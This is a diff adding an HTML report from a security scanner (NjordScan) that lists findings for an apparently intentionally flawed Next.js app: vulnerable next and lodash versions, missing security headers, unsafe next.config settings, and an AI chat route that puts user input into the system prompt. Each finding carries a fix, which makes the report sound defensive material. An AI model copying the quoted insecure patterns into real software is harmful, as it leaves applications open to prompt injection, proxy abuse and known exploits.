+        <div class="block"><h4>Found here</h4><pre><code>&quot;next&quot;: &quot;12.1.0&quot;  // CVE-2024-47831</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This package version has a publicly documented security flaw (a CVE/advisory). Attackers actively scan for apps using vulnerable versions because a working exploit is already published.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Upgrade to the patched version listed in the advisory (`npm update &lt;pkg&gt;` or bump it in package.json).</p>
+          <pre class="fix"><code>npm install &lt;package&gt;@&lt;patched-version&gt;</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://github.com/advisories" rel="noopener noreferrer" target="_blank">https://github.com/advisories</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ca8a04">
+      <summary>
+        <span class="sev" style="background:#ca8a04">MEDIUM</span>
+        <span class="ftitle">Dependency with a known security vulnerability</span>
+        <span class="floc">package.json:11</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-1395 · A06:2021-Vulnerable and Outdated Components · confidence: high</p>
+        <p class="msg">next@12.1.0 is affected by CVE-2026-44577 (vulnerable &gt;=10.0.0,&lt;15.5.16). Upgrade to 15.5.16 or later. (EPSS 0% 30-day exploit probability) 🎯 `next` is imported and used in your code. Next.js has a Denial of Service in the Image Optimization API</p>
+        <div class="block"><h4>Found here</h4><pre><code>&quot;next&quot;: &quot;12.1.0&quot;  // CVE-2026-44577</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This package version has a publicly documented security flaw (a CVE/advisory). Attackers actively scan for apps using vulnerable versions because a working exploit is already published.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Upgrade to the patched version listed in the advisory (`npm update &lt;pkg&gt;` or bump it in package.json).</p>
+          <pre class="fix"><code>npm install &lt;package&gt;@&lt;patched-version&gt;</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://github.com/advisories" rel="noopener noreferrer" target="_blank">https://github.com/advisories</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ca8a04">
+      <summary>
+        <span class="sev" style="background:#ca8a04">MEDIUM</span>
+        <span class="ftitle">Dependency with a known security vulnerability</span>
+        <span class="floc">package.json:11</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-1395 · A06:2021-Vulnerable and Outdated Components · confidence: high</p>
+        <p class="msg">next@12.1.0 is affected by CVE-2025-55173 (vulnerable &gt;=0.9.9,&lt;14.2.31). Upgrade to 14.2.31 or later. (EPSS 1% 30-day exploit probability) 🎯 `next` is imported and used in your code. Next.js Content Injection Vulnerability for Image Optimization</p>
+        <div class="block"><h4>Found here</h4><pre><code>&quot;next&quot;: &quot;12.1.0&quot;  // CVE-2025-55173</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This package version has a publicly documented security flaw (a CVE/advisory). Attackers actively scan for apps using vulnerable versions because a working exploit is already published.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Upgrade to the patched version listed in the advisory (`npm update &lt;pkg&gt;` or bump it in package.json).</p>
+          <pre class="fix"><code>npm install &lt;package&gt;@&lt;patched-version&gt;</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://github.com/advisories" rel="noopener noreferrer" target="_blank">https://github.com/advisories</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ca8a04">
+      <summary>
+        <span class="sev" style="background:#ca8a04">MEDIUM</span>
+        <span class="ftitle">Dependency with a known security vulnerability</span>
+        <span class="floc">package.json:14</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-1395 · A06:2021-Vulnerable and Outdated Components · confidence: high</p>
+        <p class="msg">lodash@4.17.15 is affected by CVE-2020-28500 (vulnerable &gt;=4.0.0,&lt;4.17.21). Upgrade to 4.17.21 or later. (EPSS 0% 30-day exploit probability) 🎯 `lodash` is imported and used in your code. Regular Expression Denial of Service (ReDoS) in lodash</p>
+        <div class="block"><h4>Found here</h4><pre><code>&quot;lodash&quot;: &quot;4.17.15&quot;  // CVE-2020-28500</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This package version has a publicly documented security flaw (a CVE/advisory). Attackers actively scan for apps using vulnerable versions because a working exploit is already published.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Upgrade to the patched version listed in the advisory (`npm update &lt;pkg&gt;` or bump it in package.json).</p>
+          <pre class="fix"><code>npm install &lt;package&gt;@&lt;patched-version&gt;</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://github.com/advisories" rel="noopener noreferrer" target="_blank">https://github.com/advisories</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ca8a04">
+      <summary>
+        <span class="sev" style="background:#ca8a04">MEDIUM</span>
+        <span class="ftitle">Dependency with a known security vulnerability</span>
+        <span class="floc">package.json:14</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-1395 · A06:2021-Vulnerable and Outdated Components · confidence: high</p>
+        <p class="msg">lodash@4.17.15 is affected by CVE-2026-2950 (vulnerable &lt;4.18.0). Upgrade to 4.18.0 or later. (EPSS 0% 30-day exploit probability) 🎯 `lodash` is imported and used in your code. lodash vulnerable to Prototype Pollution via array path bypass in `_.unset` and `_.omit`</p>
+        <div class="block"><h4>Found here</h4><pre><code>&quot;lodash&quot;: &quot;4.17.15&quot;  // CVE-2026-2950</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This package version has a publicly documented security flaw (a CVE/advisory). Attackers actively scan for apps using vulnerable versions because a working exploit is already published.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Upgrade to the patched version listed in the advisory (`npm update &lt;pkg&gt;` or bump it in package.json).</p>
+          <pre class="fix"><code>npm install &lt;package&gt;@&lt;patched-version&gt;</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://github.com/advisories" rel="noopener noreferrer" target="_blank">https://github.com/advisories</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ca8a04">
+      <summary>
+        <span class="sev" style="background:#ca8a04">MEDIUM</span>
+        <span class="ftitle">Dependency with a known security vulnerability</span>
+        <span class="floc">package.json:14</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-1395 · A06:2021-Vulnerable and Outdated Components · confidence: high</p>
+        <p class="msg">lodash@4.17.15 is affected by CVE-2025-13465 (vulnerable &gt;=4.0.0,&lt;4.17.23). Upgrade to 4.17.23 or later. (EPSS 0% 30-day exploit probability) 🎯 `lodash` is imported and used in your code. Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions</p>
+        <div class="block"><h4>Found here</h4><pre><code>&quot;lodash&quot;: &quot;4.17.15&quot;  // CVE-2025-13465</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This package version has a publicly documented security flaw (a CVE/advisory). Attackers actively scan for apps using vulnerable versions because a working exploit is already published.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Upgrade to the patched version listed in the advisory (`npm update &lt;pkg&gt;` or bump it in package.json).</p>
+          <pre class="fix"><code>npm install &lt;package&gt;@&lt;patched-version&gt;</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://github.com/advisories" rel="noopener noreferrer" target="_blank">https://github.com/advisories</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ca8a04">
+      <summary>
+        <span class="sev" style="background:#ca8a04">MEDIUM</span>
+        <span class="ftitle">Missing security response headers</span>
+        <span class="floc">next.config.js:1</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-693 · A05:2021-Security Misconfiguration · confidence: low</p>
+        <p class="msg">next.config defines no security headers (no `headers()` setting X-Frame-Options / Content-Security-Policy / Strict-Transport-Security). Add them for defense in depth, unless you set them in middleware.</p>
+        
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>Security headers (Content-Security-Policy, X-Frame-Options, Strict-Transport-Security, X-Content-Type-Options) are extra guardrails the browser enforces for you — blocking clickjacking, forcing HTTPS, and limiting the damage of an XSS bug. Without them you lose defense in depth.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Set security headers in next.config.js `headers()` (or your server/middleware).</p>
+          <pre class="fix"><code>// next.config.js
+async headers() {
+  return [{ source: &#x27;/(.*)&#x27;, headers: [
+    { key: &#x27;X-Frame-Options&#x27;, value: &#x27;DENY&#x27; },
+    { key: &#x27;X-Content-Type-Options&#x27;, value: &#x27;nosniff&#x27; },
+    { key: &#x27;Strict-Transport-Security&#x27;, value: &#x27;max-age=63072000; includeSubDomains; preload&#x27; },
+  ]}];
+}</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://nextjs.org/docs/app/api-reference/next-config-js/headers" rel="noopener noreferrer" target="_blank">https://nextjs.org/docs/app/api-reference/next-config-js/headers</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ca8a04">
+      <summary>
+        <span class="sev" style="background:#ca8a04">MEDIUM</span>
+        <span class="ftitle">Insecure Next.js configuration</span>
+        <span class="floc">next.config.js:2</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-16 · A05:2021-Security Misconfiguration · confidence: high</p>
+        <p class="msg">`typescript.ignoreBuildErrors: true` disables a safety check, letting type/lint errors ship to production.</p>
+        <div class="block"><h4>Found here</h4><pre><code>typescript: { ignoreBuildErrors: true },   // ships type errors to prod</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>Some next.config options loosen safety in ways that are easy to ship by accident — e.g. ignoring build/type errors hides real bugs, and overly broad image `domains`/`remotePatterns` let attackers proxy arbitrary content through your domain.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Don&#x27;t ignore type/lint errors in production builds, and scope image and rewrite patterns to hosts you control.</p>
+          <pre class="fix"><code>images: { remotePatterns: [{ protocol: &#x27;https&#x27;, hostname: &#x27;assets.example.com&#x27; }] }</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://nextjs.org/docs/app/api-reference/next-config-js" rel="noopener noreferrer" target="_blank">https://nextjs.org/docs/app/api-reference/next-config-js</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ca8a04">
+      <summary>
+        <span class="sev" style="background:#ca8a04">MEDIUM</span>
+        <span class="ftitle">Insecure Next.js configuration</span>
+        <span class="floc">next.config.js:3</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-16 · A05:2021-Security Misconfiguration · confidence: high</p>
+        <p class="msg">`eslint.ignoreDuringBuilds: true` disables a safety check, letting type/lint errors ship to production.</p>
+        <div class="block"><h4>Found here</h4><pre><code>eslint: { ignoreDuringBuilds: true },</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>Some next.config options loosen safety in ways that are easy to ship by accident — e.g. ignoring build/type errors hides real bugs, and overly broad image `domains`/`remotePatterns` let attackers proxy arbitrary content through your domain.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Don&#x27;t ignore type/lint errors in production builds, and scope image and rewrite patterns to hosts you control.</p>
+          <pre class="fix"><code>images: { remotePatterns: [{ protocol: &#x27;https&#x27;, hostname: &#x27;assets.example.com&#x27; }] }</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://nextjs.org/docs/app/api-reference/next-config-js" rel="noopener noreferrer" target="_blank">https://nextjs.org/docs/app/api-reference/next-config-js</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ca8a04">
+      <summary>
+        <span class="sev" style="background:#ca8a04">MEDIUM</span>
+        <span class="ftitle">Insecure Next.js configuration</span>
+        <span class="floc">next.config.js:4</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-16 · A05:2021-Security Misconfiguration · confidence: high</p>
+        <p class="msg">`images.domains` contains a wildcard &#x27;*&#x27; — any host can be proxied through your Next.js image optimizer.</p>
+        <div class="block"><h4>Found here</h4><pre><code>images: { domains: [&#x27;*&#x27;] },                 // any host can be proxied</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>Some next.config options loosen safety in ways that are easy to ship by accident — e.g. ignoring build/type errors hides real bugs, and overly broad image `domains`/`remotePatterns` let attackers proxy arbitrary content through your domain.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Don&#x27;t ignore type/lint errors in production builds, and scope image and rewrite patterns to hosts you control.</p>
+          <pre class="fix"><code>images: { remotePatterns: [{ protocol: &#x27;https&#x27;, hostname: &#x27;assets.example.com&#x27; }] }</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://nextjs.org/docs/app/api-reference/next-config-js" rel="noopener noreferrer" target="_blank">https://nextjs.org/docs/app/api-reference/next-config-js</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#0891b2">
+      <summary>
+        <span class="sev" style="background:#0891b2">LOW</span>
+        <span class="ftitle">Model call sets no max output token limit</span>
+        <span class="floc">app/api/chat/route.ts:7</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-770 · A04:2021-Insecure Design · confidence: medium</p>
+        <p class="msg">This model call sets no max output-token limit — output tokens are the costliest part of an AI call, so a crafted prompt can balloon your bill. Set max_tokens / max_output_tokens.</p>
+        <div class="block"><h4>Found here</h4><pre><code>chat.completions.create({
+    messages: [
+      { role: &#x27;system&#x27;, content: &#x27;You are a shop assistant. &#x27; + body.persona }, // prompt injection
+      { role: &#x27;user&#x27;, content: body.message },
+    ],
+  })</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This model call doesn&#x27;t set a maximum on how much text the model can
+generate (no `max_tokens` / `max_output_tokens` / `maxOutputTokens`). Output
+tokens are usually the most expensive part of an AI call, so an unbounded
+response can cost far more than you expect — and an attacker can deliberately
+craft a prompt that makes the model ramble to the limit, multiplying your
+bill across many requests. It can also make responses slow and unpredictable.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Set an explicit cap on output length on every model call. Pick the smallest
+number that still fits your feature (e.g. a chat reply rarely needs more than
+a few hundred tokens). The exact field name depends on the SDK: `max_tokens`
+(OpenAI chat / Anthropic), `max_output_tokens` (OpenAI Responses), or
+`maxOutputTokens` (Vercel AI SDK).</p>
+          <pre class="fix"><code>const completion = await openai.chat.completions.create({
+  model: &#x27;gpt-4o-mini&#x27;,
+  max_tokens: 500,        // cap the response
+  messages,
+});</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://platform.openai.com/docs/api-reference/chat/create#chat-create-max_tokens" rel="noopener noreferrer" target="_blank">https://platform.openai.com/docs/api-reference/chat/create#chat-create-max_tokens</a></li><li><a href="https://owasp.org/www-project-top-10-for-large-language-model-applications/" rel="noopener noreferrer" target="_blank">https://owasp.org/www-project-top-10-for-large-language-model-applications/</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#0891b2">
+      <summary>
+        <span class="sev" style="background:#0891b2">LOW</span>
+        <span class="ftitle">Dependency with a known security vulnerability</span>
+        <span class="floc">package.json:11</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-1395 · A06:2021-Vulnerable and Outdated Components · confidence: high</p>
+        <p class="msg">next@12.1.0 is affected by CVE-2025-32421 (vulnerable &gt;=0.9.9,&lt;14.2.24). Upgrade to 14.2.24 or later. (EPSS 1% 30-day exploit probability) 🎯 `next` is imported and used in your code. Next.js Race Condition to Cache Poisoning</p>
+        <div class="block"><h4>Found here</h4><pre><code>&quot;next&quot;: &quot;12.1.0&quot;  // CVE-2025-32421</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This package version has a publicly documented security flaw (a CVE/advisory). Attackers actively scan for apps using vulnerable versions because a working exploit is already published.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Upgrade to the patched version listed in the advisory (`npm update &lt;pkg&gt;` or bump it in package.json).</p>
+          <pre class="fix"><code>npm install &lt;package&gt;@&lt;patched-version&gt;</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://github.com/advisories" rel="noopener noreferrer" target="_blank">https://github.com/advisories</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#0891b2">
+      <summary>
+        <span class="sev" style="background:#0891b2">LOW</span>
+        <span class="ftitle">Dependency with a known security vulnerability</span>
+        <span class="floc">package.json:14</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-1395 · A06:2021-Vulnerable and Outdated Components · confidence: high</p>
+        <p class="msg">lodash@4.17.15 is affected by CVE-2020-8203 (vulnerable &lt;4.17.20). Upgrade to 4.17.20 or later. (EPSS 3% 30-day exploit probability) ✅ Lower priority: you import `lodash` but never call the vulnerable `set, setWith, zipObjectDeep`. Prototype pollution in lodash via zipObjectDeep / set-like paths allowing modification of Object.prototype.</p>
+        <div class="block"><h4>Found here</h4><pre><code>&quot;lodash&quot;: &quot;4.17.15&quot;  // CVE-2020-8203</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This package version has a publicly documented security flaw (a CVE/advisory). Attackers actively scan for apps using vulnerable versions because a working exploit is already published.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Upgrade to the patched version listed in the advisory (`npm update &lt;pkg&gt;` or bump it in package.json).</p>
+          <pre class="fix"><code>npm install &lt;package&gt;@&lt;patched-version&gt;</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://github.com/advisories" rel="noopener noreferrer" target="_blank">https://github.com/advisories</a></li></ul></div>
+      </div>
+    </details>
+  <footer>Generated by NjordScan v2.0.0b1. No scanner catches everything — review anything that handles user input.</footer>
+</div></body></html>
